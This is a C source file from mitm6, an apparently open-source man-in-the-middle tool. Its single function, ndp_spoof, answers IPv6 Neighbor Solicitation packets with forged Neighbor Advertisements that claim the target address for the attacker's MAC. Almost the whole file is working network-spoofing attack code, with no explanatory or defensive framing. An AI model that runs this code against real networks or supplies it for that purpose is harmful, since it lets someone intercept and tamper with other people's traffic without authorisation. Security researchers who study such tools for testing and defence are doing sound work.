/*
 * Copyright (c) Rocco Folino
 *
 * This file is part of mitm6.
 *
 * Mitm6 is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Mitm6 is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with mitm6.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <arpa/inet.h>
#include <string.h>

#include "mitm6.h"
#include "packet.h"
#include "protocols.h"

extern char *iface;

void ndp_spoof(const u_char *bytes, size_t len)
{
        struct ether *ether = NULL;
        struct ip6 *ip = NULL;
        struct icmp6 *icmp = NULL;
        struct icmp6_nd_ns *ns = NULL;
        char s1[INET6_ADDRSTRLEN], s2[INET6_ADDRSTRLEN];
        struct packet *p = NULL;
        u_char *mac = NULL;

        ether = (struct ether *)bytes;
        ip = (struct ip6 *)(bytes + sizeof(struct ether));

        if (ip->nxt == IP6_NXT_ICMP6) {
                icmp = (struct icmp6 *)(bytes + sizeof(struct ether) + sizeof(struct ip6));
        } else {
                /* TODO */
                fatal("no ICMPv6 packet!!! Skipping...");
                return;
        }
        
        if (icmp->type == ICMP6_T_ND_NS) {

                mac = get_mac(iface);
                if (mac == NULL)
                        return;
                
                if (memcmp(mac, ether->src, ETH_ADDR_LEN) == 0) {
                        free(mac);
                        return;
                }

                ns = (struct icmp6_nd_ns *)(bytes + sizeof(struct ether) + sizeof(struct ip6) + sizeof(struct icmp6));

                bzero(s1, INET6_ADDRSTRLEN);
                inet_ntop(AF_INET6, ns->target, s1, INET6_ADDRSTRLEN);
                bzero(s2, INET6_ADDRSTRLEN);
                inet_ntop(AF_INET6, ip->src, s2, INET6_ADDRSTRLEN);

                printf("Spoofing %s with target %s\n", s2, s1);

                p = packet_init();
                packet_add_ether(p, mac, ether->src, ETH_TYPE_IP6);
                packet_add_ip6(p, sizeof(struct icmp6) + sizeof(struct icmp6_nd_na), IP6_NXT_ICMP6, IP6_HLIM, ns->target, ip->src);
                packet_add_icmp6_nd_na(p, ICMP6_ND_NA_F_SOLICIT | ICMP6_ND_NA_F_OVERRIDE, ns->target);
                packet_send(iface, p);
                packet_free(p);

                free(mac);
        }
}
